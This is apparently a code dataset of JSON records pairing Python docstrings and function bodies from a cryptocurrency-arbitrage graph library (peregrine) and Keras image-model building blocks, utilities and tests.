{"docstring": "\"\"\"\nLook at the docstring of the bellman_ford method in the NegativeWeightFinder class. (This is a static wrapper\nfunction.)\n\nIf depth is true, yields all negatively weighted paths (accounting for depth) when starting with a weight of\nstarting_amount.\n\"\"\"\n", "func_signal": "def bellman_ford(graph, source='BTC', unique_paths=True, depth=False):\n", "code": "if depth:\n    return NegativeWeightDepthFinder(graph).bellman_ford(source, unique_paths)\nelse:\n    return NegativeWeightFinder(graph).bellman_ford(source, unique_paths)", "path": "peregrine/peregrinearb/bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nRetraces an arbitrage opportunity (negative cycle) which a currency can reach and returns it.\n\nParameters\n----------\nstart\n    A node (currency) from which it is known an arbitrage opportunity is reachable\nunique_paths : bool\n    unique_paths: If True, no duplicate opportunities are returned\n\nReturns\n-------\nlist\n    An arbitrage opportunity reachable from start. Value is None if seen_nodes is True and a\n    duplicate opportunity would be returned.\n\"\"\"\n", "func_signal": "def _retrace_negative_cycle(self, start, unique_paths):\n", "code": "arbitrage_loop = [start]\nprior_node = start\nwhile True:\n    prior_node = self.predecessor_to[prior_node]\n    # if negative cycle is complete\n    if prior_node in arbitrage_loop:\n        arbitrage_loop = arbitrage_loop[:last_index_in_list(arbitrage_loop, prior_node) + 1]\n        arbitrage_loop.insert(0, prior_node)\n        return arbitrage_loop\n\n    # because if prior_node is in arbitrage_loop prior_node must be in self.seen_nodes. thus, this conditional\n    # must proceed checking if prior_node is in arbitrage_loop\n    if unique_paths and prior_node in self.seen_nodes:\n        return None\n\n    arbitrage_loop.insert(0, prior_node)\n    self.seen_nodes.add(prior_node)", "path": "peregrine/peregrinearb/bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nAn object of type OpportunityFinder finds the largest price disparity between exchanges for a given\ncryptocurrency market by finding the exchange with the lowest market ask price and the exchange with the\nhighest market bid price.\n\"\"\"\n", "func_signal": "def __init__(self, market_name, exchanges=None, name=True, invocation_id=0):\n", "code": "logger = logging.getLogger(INTER_LOGGING_PATH + __name__)\nself.adapter = InterExchangeAdapter(logger, {'invocation_id': invocation_id, 'market': market_name})\nself.adapter.debug('Initializing OpportunityFinder for {}'.format(market_name))\n\nif exchanges is None:\n    self.adapter.warning('Parameter name\\'s being false has no effect.')\n    exchanges = get_exchanges_for_market(market_name)\n\nif name:\n    exchanges = [getattr(ccxt, exchange_id)() for exchange_id in exchanges]\n\nself.exchange_list = exchanges\nself.market_name = market_name\nself.highest_bid = {'exchange': None, 'price': -1}\nself.lowest_ask = {'exchange': None, 'price': float('Inf')}\nself.adapter.debug('Initialized OpportunityFinder for {}'.format(market_name))", "path": "peregrine/peregrinearb/async_find_opportunities.py", "commit_date": "2020-01-08 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"Tests NegativeWeightDepthFinder as it is used for arbitrage\"\"\"\n", "func_signal": "def test_negative_weight_depth_finder_c(self):\n", "code": "symbols = ['BTC/USD', 'ETH/USD', 'ETH/BTC', 'LTC/BTC', 'LTC/USD', 'ETH/LTC', 'DRC/BTC', 'DRC/ETH']\nmarkets = {symbol: {\n    'volume_increment': 10 ** -8,\n    'price_increment': 10 ** -8,\n    'min_market_funds': 10 ** -16,\n    'taker_fee': 0.001,\n    'maker_fee': 0,\n} for symbol in symbols}\ngraph = nx.DiGraph()\n[wss_add_market(graph, k, v) for k, v in markets.items()]\nwss_update_graph(graph, 'BTC/USD', 'asks', 5000, 0.5)\nwss_update_graph(graph, 'ETH/USD', 'bids', 500, 6)\nwss_update_graph(graph, 'ETH/BTC', 'asks', 0.14, 8)\n\nnwdf = NegativeWeightDepthFinder(graph)\npaths = nwdf.bellman_ford('BTC')\nfor p in paths:\n    print(p)", "path": "peregrine/peregrinearb/tests/test_bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nSomewhat slow. (I think O(n^2))\n\"\"\"\n", "func_signal": "def __len__(self):\n", "code": "total = 0\nseen = set()\nfor elem in self.heap:\n    if elem not in self.popped and elem not in seen:\n        total += 1\n        seen.add(elem)\n\nreturn total", "path": "peregrine/peregrinearb/utils/data_structures.py", "commit_date": "2018-10-18 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nEdge bunch must be of the format (u, v, d) where u and v are the tail and head nodes (respectively) and d is a list\nof dicts holding the edge_data for each edge in the bunch\n\nNot optimized because currently the only place that calls it first checks len(edge_bunch[2]) > 0\ntodo: could take only edge_bunch[2] as parameter\ntodo: not needed for this project: could put in wardbradt/networkx\n\"\"\"\n", "func_signal": "def get_greatest_edge_in_bunch(edge_bunch, weight='weight'):\n", "code": "if len(edge_bunch[2]) == 0:\n    raise ValueError(\"Edge bunch must contain more than one edge.\")\ngreatest = {weight: -float('Inf')}\nfor data in edge_bunch[2]:\n    if data[weight] > greatest[weight]:\n        greatest = data\n\nreturn greatest", "path": "peregrine/peregrinearb/utils/graph_utils.py", "commit_date": "2018-12-01 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"Adds a Inception-ResNet block.\n\nThis function builds 3 types of Inception-ResNet blocks mentioned\nin the paper, controlled by the `block_type` argument (which is the\nblock name used in the official TF-slim implementation):\n    - Inception-ResNet-A: `block_type='block35'`\n    - Inception-ResNet-B: `block_type='block17'`\n    - Inception-ResNet-C: `block_type='block8'`\n\n# Arguments\n    x: input tensor.\n    scale: scaling factor to scale the residuals (i.e., the output of\n        passing `x` through an inception module) before adding them\n        to the shortcut branch.\n        Let `r` be the output from the residual branch,\n        the output of this block will be `x + scale * r`.\n    block_type: `'block35'`, `'block17'` or `'block8'`, determines\n        the network structure in the residual branch.\n    block_idx: an `int` used for generating layer names.\n        The Inception-ResNet blocks\n        are repeated many times in this network.\n        We use `block_idx` to identify\n        each of the repetitions. For example,\n        the first Inception-ResNet-A block\n        will have `block_type='block35', block_idx=0`,\n        and the layer names will have\n        a common prefix `'block35_0'`.\n    activation: activation function to use at the end of the block\n        (see [activations](../activations.md)).\n        When `activation=None`, no activation is applied\n        (i.e., \"linear\" activation: `a(x) = x`).\n\n# Returns\n    Output tensor for the block.\n\n# Raises\n    ValueError: if `block_type` is not one of `'block35'`,\n        `'block17'` or `'block8'`.\n\"\"\"\n", "func_signal": "def inception_resnet_block(x, scale, block_type, block_idx, activation='relu'):\n", "code": "if block_type == 'block35':\n    branch_0 = conv2d_bn(x, 32, 1)\n    branch_1 = conv2d_bn(x, 32, 1)\n    branch_1 = conv2d_bn(branch_1, 32, 3)\n    branch_2 = conv2d_bn(x, 32, 1)\n    branch_2 = conv2d_bn(branch_2, 48, 3)\n    branch_2 = conv2d_bn(branch_2, 64, 3)\n    branches = [branch_0, branch_1, branch_2]\nelif block_type == 'block17':\n    branch_0 = conv2d_bn(x, 192, 1)\n    branch_1 = conv2d_bn(x, 128, 1)\n    branch_1 = conv2d_bn(branch_1, 160, [1, 7])\n    branch_1 = conv2d_bn(branch_1, 192, [7, 1])\n    branches = [branch_0, branch_1]\nelif block_type == 'block8':\n    branch_0 = conv2d_bn(x, 192, 1)\n    branch_1 = conv2d_bn(x, 192, 1)\n    branch_1 = conv2d_bn(branch_1, 224, [1, 3])\n    branch_1 = conv2d_bn(branch_1, 256, [3, 1])\n    branches = [branch_0, branch_1]\nelse:\n    raise ValueError('Unknown Inception-ResNet block type. '\n                     'Expects \"block35\", \"block17\" or \"block8\", '\n                     'but got: ' + str(block_type))\n\nblock_name = block_type + '_' + str(block_idx)\nchannel_axis = 1 if backend.image_data_format() == 'channels_first' else 3\nmixed = layers.Concatenate(\n    axis=channel_axis, name=block_name + '_mixed')(branches)\nup = conv2d_bn(mixed,\n               backend.int_shape(x)[channel_axis],\n               1,\n               activation=None,\n               use_bias=True,\n               name=block_name + '_conv')\n\nx = layers.Lambda(lambda inputs, scale: inputs[0] + inputs[1] * scale,\n                  output_shape=backend.int_shape(x)[1:],\n                  arguments={'scale': scale},\n                  name=block_name)([x, up])\nif activation is not None:\n    x = layers.Activation(activation, name=block_name + '_ac')(x)\nreturn x", "path": "keras-applications/keras_applications/inception_resnet_v2.py", "commit_date": "2019-03-29 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "# Test image batch\n", "func_signal": "def test_preprocess_input_symbolic():\n", "code": "x = np.random.uniform(0, 255, (2, 10, 10, 3))\ninputs = layers.Input(shape=x.shape[1:])\noutputs = layers.Lambda(preprocess_input, output_shape=x.shape[1:])(inputs)\nmodel = models.Model(inputs, outputs)\nassert model.predict(x).shape == x.shape\n\noutputs1 = layers.Lambda(\n    lambda x: preprocess_input(x, 'channels_last'),\n    output_shape=x.shape[1:])(inputs)\nmodel1 = models.Model(inputs, outputs1)\nout1 = model1.predict(x)\nx2 = np.transpose(x, (0, 3, 1, 2))\ninputs2 = layers.Input(shape=x2.shape[1:])\noutputs2 = layers.Lambda(\n    lambda x: preprocess_input(x, 'channels_first'),\n    output_shape=x2.shape[1:])(inputs2)\nmodel2 = models.Model(inputs2, outputs2)\nout2 = model2.predict(x2)\nassert_allclose(out1, out2.transpose(0, 2, 3, 1))\n\n# Test single image\nx = np.random.uniform(0, 255, (10, 10, 3))\ninputs = layers.Input(shape=x.shape)\noutputs = layers.Lambda(preprocess_input, output_shape=x.shape)(inputs)\nmodel = models.Model(inputs, outputs)\nassert model.predict(x[np.newaxis])[0].shape == x.shape\n\noutputs1 = layers.Lambda(\n    lambda x: preprocess_input(x, 'channels_last'),\n    output_shape=x.shape)(inputs)\nmodel1 = models.Model(inputs, outputs1)\nout1 = model1.predict(x[np.newaxis])[0]\nx2 = np.transpose(x, (2, 0, 1))\ninputs2 = layers.Input(shape=x2.shape)\noutputs2 = layers.Lambda(\n    lambda x: preprocess_input(x, 'channels_first'),\n    output_shape=x2.shape)(inputs2)\nmodel2 = models.Model(inputs2, outputs2)\nout2 = model2.predict(x2[np.newaxis])[0]\nassert_allclose(out1, out2.transpose(1, 2, 0))", "path": "keras-applications/tests/imagenet_utils_test.py", "commit_date": "2018-08-23 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"Adds an initial convolution layer (with batch normalization and relu6).\n\n# Arguments\n    inputs: Input tensor of shape `(rows, cols, 3)`\n        (with `channels_last` data format) or\n        (3, rows, cols) (with `channels_first` data format).\n        It should have exactly 3 inputs channels,\n        and width and height should be no smaller than 32.\n        E.g. `(224, 224, 3)` would be one valid value.\n    filters: Integer, the dimensionality of the output space\n        (i.e. the number of output filters in the convolution).\n    alpha: controls the width of the network.\n        - If `alpha` < 1.0, proportionally decreases the number\n            of filters in each layer.\n        - If `alpha` > 1.0, proportionally increases the number\n            of filters in each layer.\n        - If `alpha` = 1, default number of filters from the paper\n             are used at each layer.\n    kernel: An integer or tuple/list of 2 integers, specifying the\n        width and height of the 2D convolution window.\n        Can be a single integer to specify the same value for\n        all spatial dimensions.\n    strides: An integer or tuple/list of 2 integers,\n        specifying the strides of the convolution\n        along the width and height.\n        Can be a single integer to specify the same value for\n        all spatial dimensions.\n        Specifying any stride value != 1 is incompatible with specifying\n        any `dilation_rate` value != 1.\n\n# Input shape\n    4D tensor with shape:\n    `(samples, channels, rows, cols)` if data_format='channels_first'\n    or 4D tensor with shape:\n    `(samples, rows, cols, channels)` if data_format='channels_last'.\n\n# Output shape\n    4D tensor with shape:\n    `(samples, filters, new_rows, new_cols)`\n    if data_format='channels_first'\n    or 4D tensor with shape:\n    `(samples, new_rows, new_cols, filters)`\n    if data_format='channels_last'.\n    `rows` and `cols` values might have changed due to stride.\n\n# Returns\n    Output tensor of block.\n\"\"\"\n", "func_signal": "def _conv_block(inputs, filters, alpha, kernel=(3, 3), strides=(1, 1)):\n", "code": "channel_axis = 1 if backend.image_data_format() == 'channels_first' else -1\nfilters = int(filters * alpha)\nx = layers.ZeroPadding2D(padding=((0, 1), (0, 1)), name='conv1_pad')(inputs)\nx = layers.Conv2D(filters, kernel,\n                  padding='valid',\n                  use_bias=False,\n                  strides=strides,\n                  name='conv1')(x)\nx = layers.BatchNormalization(axis=channel_axis, name='conv1_bn')(x)\nreturn layers.ReLU(6., name='conv1_relu')(x)", "path": "keras-applications/keras_applications/mobilenet.py", "commit_date": "2019-04-15 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"Preprocesses a tensor or Numpy array encoding a batch of images.\n\n# Arguments\n    x: Input Numpy or symbolic tensor, 3D or 4D.\n        The preprocessed data is written over the input data\n        if the data types are compatible. To avoid this\n        behaviour, `numpy.copy(x)` can be used.\n    data_format: Data format of the image tensor/array.\n    mode: One of \"caffe\", \"tf\" or \"torch\".\n        - caffe: will convert the images from RGB to BGR,\n            then will zero-center each color channel with\n            respect to the ImageNet dataset,\n            without scaling.\n        - tf: will scale pixels between -1 and 1,\n            sample-wise.\n        - torch: will scale pixels between 0 and 1 and then\n            will normalize each channel with respect to the\n            ImageNet dataset.\n\n# Returns\n    Preprocessed tensor or Numpy array.\n\n# Raises\n    ValueError: In case of unknown `data_format` argument.\n\"\"\"\n", "func_signal": "def preprocess_input(x, data_format=None, mode='caffe', **kwargs):\n", "code": "backend, _, _, _ = get_submodules_from_kwargs(kwargs)\n\nif data_format is None:\n    data_format = backend.image_data_format()\nif data_format not in {'channels_first', 'channels_last'}:\n    raise ValueError('Unknown data_format ' + str(data_format))\n\nif isinstance(x, np.ndarray):\n    return _preprocess_numpy_input(x, data_format=data_format,\n                                   mode=mode, **kwargs)\nelse:\n    return _preprocess_symbolic_input(x, data_format=data_format,\n                                      mode=mode, **kwargs)", "path": "keras-applications/keras_applications/imagenet_utils.py", "commit_date": "2019-07-01 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "'''Adds a Reduction cell for NASNet-A (Fig. 4 in the paper).\n\n# Arguments\n    ip: Input tensor `x`\n    p: Input tensor `p`\n    filters: Number of output filters\n    block_id: String block_id\n\n# Returns\n    A Keras tensor\n'''\n", "func_signal": "def _reduction_a_cell(ip, p, filters, block_id=None):\n", "code": "channel_dim = 1 if backend.image_data_format() == 'channels_first' else -1\n\nwith backend.name_scope('reduction_A_block_%s' % block_id):\n    p = _adjust_block(p, ip, filters, block_id)\n\n    h = layers.Activation('relu')(ip)\n    h = layers.Conv2D(\n        filters, (1, 1),\n        strides=(1, 1),\n        padding='same',\n        name='reduction_conv_1_%s' % block_id,\n        use_bias=False,\n        kernel_initializer='he_normal')(h)\n    h = layers.BatchNormalization(\n        axis=channel_dim,\n        momentum=0.9997,\n        epsilon=1e-3,\n        name='reduction_bn_1_%s' % block_id)(h)\n    h3 = layers.ZeroPadding2D(\n        padding=correct_pad(backend, h, 3),\n        name='reduction_pad_1_%s' % block_id)(h)\n\n    with backend.name_scope('block_1'):\n        x1_1 = _separable_conv_block(\n            h, filters, (5, 5),\n            strides=(2, 2),\n            block_id='reduction_left1_%s' % block_id)\n        x1_2 = _separable_conv_block(\n            p, filters, (7, 7),\n            strides=(2, 2),\n            block_id='reduction_right1_%s' % block_id)\n        x1 = layers.add([x1_1, x1_2], name='reduction_add_1_%s' % block_id)\n\n    with backend.name_scope('block_2'):\n        x2_1 = layers.MaxPooling2D(\n            (3, 3),\n            strides=(2, 2),\n            padding='valid',\n            name='reduction_left2_%s' % block_id)(h3)\n        x2_2 = _separable_conv_block(\n            p, filters, (7, 7),\n            strides=(2, 2),\n            block_id='reduction_right2_%s' % block_id)\n        x2 = layers.add([x2_1, x2_2], name='reduction_add_2_%s' % block_id)\n\n    with backend.name_scope('block_3'):\n        x3_1 = layers.AveragePooling2D(\n            (3, 3),\n            strides=(2, 2),\n            padding='valid',\n            name='reduction_left3_%s' % block_id)(h3)\n        x3_2 = _separable_conv_block(\n            p, filters, (5, 5),\n            strides=(2, 2),\n            block_id='reduction_right3_%s' % block_id)\n        x3 = layers.add([x3_1, x3_2], name='reduction_add3_%s' % block_id)\n\n    with backend.name_scope('block_4'):\n        x4 = layers.AveragePooling2D(\n            (3, 3),\n            strides=(1, 1),\n            padding='same',\n            name='reduction_left4_%s' % block_id)(x1)\n        x4 = layers.add([x2, x4])\n\n    with backend.name_scope('block_5'):\n        x5_1 = _separable_conv_block(\n            x1, filters, (3, 3),\n            block_id='reduction_left4_%s' % block_id)\n        x5_2 = layers.MaxPooling2D(\n            (3, 3),\n            strides=(2, 2),\n            padding='valid',\n            name='reduction_right5_%s' % block_id)(h3)\n        x5 = layers.add([x5_1, x5_2], name='reduction_add4_%s' % block_id)\n\n    x = layers.concatenate(\n        [x2, x3, x4, x5],\n        axis=channel_dim,\n        name='reduction_concat_%s' % block_id)\n    return x, ip", "path": "keras-applications/keras_applications/nasnet.py", "commit_date": "2019-03-29 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"Decodes the prediction of an ImageNet model.\n\n# Arguments\n    preds: Numpy tensor encoding a batch of predictions.\n    top: Integer, how many top-guesses to return.\n\n# Returns\n    A list of lists of top class prediction tuples\n    `(class_name, class_description, score)`.\n    One list of tuples per sample in batch input.\n\n# Raises\n    ValueError: In case of invalid shape of the `pred` array\n        (must be 2D).\n\"\"\"\n", "func_signal": "def decode_predictions(preds, top=5, **kwargs):\n", "code": "global CLASS_INDEX\n\nbackend, _, _, keras_utils = get_submodules_from_kwargs(kwargs)\n\nif len(preds.shape) != 2 or preds.shape[1] != 1000:\n    raise ValueError('`decode_predictions` expects '\n                     'a batch of predictions '\n                     '(i.e. a 2D array of shape (samples, 1000)). '\n                     'Found array with shape: ' + str(preds.shape))\nif CLASS_INDEX is None:\n    fpath = keras_utils.get_file(\n        'imagenet_class_index.json',\n        CLASS_INDEX_PATH,\n        cache_subdir='models',\n        file_hash='c2c37ea517e94d9795004a39431a14cb')\n    with open(fpath) as f:\n        CLASS_INDEX = json.load(f)\nresults = []\nfor pred in preds:\n    top_indices = pred.argsort()[-top:][::-1]\n    result = [tuple(CLASS_INDEX[str(i)]) + (pred[i],) for i in top_indices]\n    result.sort(key=lambda x: x[2], reverse=True)\n    results.append(result)\nreturn results", "path": "keras-applications/keras_applications/imagenet_utils.py", "commit_date": "2019-07-01 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "# input_shape and default_size are not identical.\n", "func_signal": "def test_obtain_input_shape():\n", "code": "with pytest.raises(ValueError):\n    utils._obtain_input_shape(\n        input_shape=(224, 224, 3),\n        default_size=299,\n        min_size=139,\n        data_format='channels_last',\n        require_flatten=True,\n        weights='imagenet')\n\n# Test invalid use cases\nfor data_format in ['channels_last', 'channels_first']:\n    # test warning\n    shape = (139, 139)\n    if data_format == 'channels_last':\n        input_shape = shape + (99,)\n    else:\n        input_shape = (99,) + shape\n    with pytest.warns(UserWarning):\n        utils._obtain_input_shape(\n            input_shape=input_shape,\n            default_size=None,\n            min_size=139,\n            data_format=data_format,\n            require_flatten=False,\n            weights='fake_weights')\n\n    # input_shape is smaller than min_size.\n    shape = (100, 100)\n    if data_format == 'channels_last':\n        input_shape = shape + (3,)\n    else:\n        input_shape = (3,) + shape\n    with pytest.raises(ValueError):\n        utils._obtain_input_shape(\n            input_shape=input_shape,\n            default_size=None,\n            min_size=139,\n            data_format=data_format,\n            require_flatten=False)\n\n    # shape is 1D.\n    shape = (100,)\n    if data_format == 'channels_last':\n        input_shape = shape + (3,)\n    else:\n        input_shape = (3,) + shape\n    with pytest.raises(ValueError):\n        utils._obtain_input_shape(\n            input_shape=input_shape,\n            default_size=None,\n            min_size=139,\n            data_format=data_format,\n            require_flatten=False)\n\n    # the number of channels is 5 not 3.\n    shape = (100, 100)\n    if data_format == 'channels_last':\n        input_shape = shape + (5,)\n    else:\n        input_shape = (5,) + shape\n    with pytest.raises(ValueError):\n        utils._obtain_input_shape(\n            input_shape=input_shape,\n            default_size=None,\n            min_size=139,\n            data_format=data_format,\n            require_flatten=False)\n\n    # require_flatten=True with dynamic input shape.\n    with pytest.raises(ValueError):\n        utils._obtain_input_shape(\n            input_shape=None,\n            default_size=None,\n            min_size=139,\n            data_format='channels_first',\n            require_flatten=True)\n\n# test include top\nassert utils._obtain_input_shape(\n    input_shape=(3, 200, 200),\n    default_size=None,\n    min_size=139,\n    data_format='channels_first',\n    require_flatten=True) == (3, 200, 200)\n\nassert utils._obtain_input_shape(\n    input_shape=None,\n    default_size=None,\n    min_size=139,\n    data_format='channels_last',\n    require_flatten=False) == (None, None, 3)\n\nassert utils._obtain_input_shape(\n    input_shape=None,\n    default_size=None,\n    min_size=139,\n    data_format='channels_first',\n    require_flatten=False) == (3, None, None)\n\nassert utils._obtain_input_shape(\n    input_shape=None,\n    default_size=None,\n    min_size=139,\n    data_format='channels_last',\n    require_flatten=False) == (None, None, 3)\n\nassert utils._obtain_input_shape(\n    input_shape=(150, 150, 3),\n    default_size=None,\n    min_size=139,\n    data_format='channels_last',\n    require_flatten=False) == (150, 150, 3)\n\nassert utils._obtain_input_shape(\n    input_shape=(3, None, None),\n    default_size=None,\n    min_size=139,\n    data_format='channels_first',\n    require_flatten=False) == (3, None, None)", "path": "keras-applications/tests/imagenet_utils_test.py", "commit_date": "2018-08-23 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"A transition block.\n\n# Arguments\n    x: input tensor.\n    reduction: float, compression rate at transition layers.\n    name: string, block label.\n\n# Returns\n    output tensor for the block.\n\"\"\"\n", "func_signal": "def transition_block(x, reduction, name):\n", "code": "bn_axis = 3 if backend.image_data_format() == 'channels_last' else 1\nx = layers.BatchNormalization(axis=bn_axis, epsilon=1.001e-5,\n                              name=name + '_bn')(x)\nx = layers.Activation('relu', name=name + '_relu')(x)\nx = layers.Conv2D(int(backend.int_shape(x)[bn_axis] * reduction), 1,\n                  use_bias=False,\n                  name=name + '_conv')(x)\nx = layers.AveragePooling2D(2, strides=2, name=name + '_pool')(x)\nreturn x", "path": "keras-applications/keras_applications/densenet.py", "commit_date": "2018-10-25 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "# For models that don't include a Flatten step,\n# the default is to accept variable-size inputs\n# even when loading ImageNet weights (since it is possible).\n# In this case, default to 299x299.\n", "func_signal": "def _get_elephant(target_size):\n", "code": "if target_size[0] is None:\n    target_size = (299, 299)\nimg = image.load_img('tests/data/elephant.jpg',\n                     target_size=tuple(target_size))\nx = image.img_to_array(img)\nreturn np.expand_dims(x, axis=0)", "path": "keras-applications/tests/applications_test.py", "commit_date": "2020-04-01 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"Returns a tuple for zero-padding for 2D convolution with downsampling.\n\n# Arguments\n    input_size: An integer or tuple/list of 2 integers.\n    kernel_size: An integer or tuple/list of 2 integers.\n\n# Returns\n    A tuple.\n\"\"\"\n", "func_signal": "def correct_pad(backend, inputs, kernel_size):\n", "code": "img_dim = 2 if backend.image_data_format() == 'channels_first' else 1\ninput_size = backend.int_shape(inputs)[img_dim:(img_dim + 2)]\n\nif isinstance(kernel_size, int):\n    kernel_size = (kernel_size, kernel_size)\n\nif input_size[0] is None:\n    adjust = (1, 1)\nelse:\n    adjust = (1 - input_size[0] % 2, 1 - input_size[1] % 2)\n\ncorrect = (kernel_size[0] // 2, kernel_size[1] // 2)\n\nreturn ((correct[0] - adjust[0], correct[0]),\n        (correct[1] - adjust[1], correct[1]))", "path": "keras-applications/keras_applications/__init__.py", "commit_date": "2020-04-01 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"The identity block is the block that has no conv layer at shortcut.\n\n# Arguments\n    input_tensor: input tensor\n    kernel_size: default 3, the kernel size of\n        middle conv layer at main path\n    filters: list of integers, the filters of 3 conv layer at main path\n    stage: integer, current stage label, used for generating layer names\n    block: 'a','b'..., current block label, used for generating layer names\n\n# Returns\n    Output tensor for the block.\n\"\"\"\n", "func_signal": "def identity_block(input_tensor, kernel_size, filters, stage, block):\n", "code": "filters1, filters2, filters3 = filters\nif backend.image_data_format() == 'channels_last':\n    bn_axis = 3\nelse:\n    bn_axis = 1\nconv_name_base = 'res' + str(stage) + block + '_branch'\nbn_name_base = 'bn' + str(stage) + block + '_branch'\n\nx = layers.Conv2D(filters1, (1, 1),\n                  kernel_initializer='he_normal',\n                  name=conv_name_base + '2a')(input_tensor)\nx = layers.BatchNormalization(axis=bn_axis, name=bn_name_base + '2a')(x)\nx = layers.Activation('relu')(x)\n\nx = layers.Conv2D(filters2, kernel_size,\n                  padding='same',\n                  kernel_initializer='he_normal',\n                  name=conv_name_base + '2b')(x)\nx = layers.BatchNormalization(axis=bn_axis, name=bn_name_base + '2b')(x)\nx = layers.Activation('relu')(x)\n\nx = layers.Conv2D(filters3, (1, 1),\n                  kernel_initializer='he_normal',\n                  name=conv_name_base + '2c')(x)\nx = layers.BatchNormalization(axis=bn_axis, name=bn_name_base + '2c')(x)\n\nx = layers.add([x, input_tensor])\nx = layers.Activation('relu')(x)\nreturn x", "path": "keras-applications/keras_applications/resnet50.py", "commit_date": "2019-03-29 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"Preprocesses a numpy array encoding a batch of images.\n\n# Arguments\n    x: a 3D or 4D numpy array consists of RGB values within [0, 255].\n    data_format: data format of the image tensor.\n\n# Returns\n    Preprocessed array.\n\"\"\"\n", "func_signal": "def preprocess_input(x, data_format=None, **kwargs):\n", "code": "return imagenet_utils.preprocess_input(x, data_format,\n                                       mode='torch', **kwargs)", "path": "keras-applications/keras_applications/densenet.py", "commit_date": "2018-10-25 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "'''Adds a Normal cell for NASNet-A (Fig. 4 in the paper).\n\n# Arguments\n    ip: Input tensor `x`\n    p: Input tensor `p`\n    filters: Number of output filters\n    block_id: String block_id\n\n# Returns\n    A Keras tensor\n'''\n", "func_signal": "def _normal_a_cell(ip, p, filters, block_id=None):\n", "code": "channel_dim = 1 if backend.image_data_format() == 'channels_first' else -1\n\nwith backend.name_scope('normal_A_block_%s' % block_id):\n    p = _adjust_block(p, ip, filters, block_id)\n\n    h = layers.Activation('relu')(ip)\n    h = layers.Conv2D(\n        filters, (1, 1),\n        strides=(1, 1),\n        padding='same',\n        name='normal_conv_1_%s' % block_id,\n        use_bias=False,\n        kernel_initializer='he_normal')(h)\n    h = layers.BatchNormalization(\n        axis=channel_dim,\n        momentum=0.9997,\n        epsilon=1e-3,\n        name='normal_bn_1_%s' % block_id)(h)\n\n    with backend.name_scope('block_1'):\n        x1_1 = _separable_conv_block(\n            h, filters,\n            kernel_size=(5, 5),\n            block_id='normal_left1_%s' % block_id)\n        x1_2 = _separable_conv_block(\n            p, filters,\n            block_id='normal_right1_%s' % block_id)\n        x1 = layers.add([x1_1, x1_2], name='normal_add_1_%s' % block_id)\n\n    with backend.name_scope('block_2'):\n        x2_1 = _separable_conv_block(\n            p, filters, (5, 5),\n            block_id='normal_left2_%s' % block_id)\n        x2_2 = _separable_conv_block(\n            p, filters, (3, 3),\n            block_id='normal_right2_%s' % block_id)\n        x2 = layers.add([x2_1, x2_2], name='normal_add_2_%s' % block_id)\n\n    with backend.name_scope('block_3'):\n        x3 = layers.AveragePooling2D(\n            (3, 3),\n            strides=(1, 1),\n            padding='same',\n            name='normal_left3_%s' % (block_id))(h)\n        x3 = layers.add([x3, p], name='normal_add_3_%s' % block_id)\n\n    with backend.name_scope('block_4'):\n        x4_1 = layers.AveragePooling2D(\n            (3, 3),\n            strides=(1, 1),\n            padding='same',\n            name='normal_left4_%s' % (block_id))(p)\n        x4_2 = layers.AveragePooling2D(\n            (3, 3),\n            strides=(1, 1),\n            padding='same',\n            name='normal_right4_%s' % (block_id))(p)\n        x4 = layers.add([x4_1, x4_2], name='normal_add_4_%s' % block_id)\n\n    with backend.name_scope('block_5'):\n        x5 = _separable_conv_block(h, filters,\n                                   block_id='normal_left5_%s' % block_id)\n        x5 = layers.add([x5, h], name='normal_add_5_%s' % block_id)\n\n    x = layers.concatenate([p, x1, x2, x3, x4, x5],\n                           axis=channel_dim,\n                           name='normal_concat_%s' % block_id)\nreturn x, ip", "path": "keras-applications/keras_applications/nasnet.py", "commit_date": "2019-03-29 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
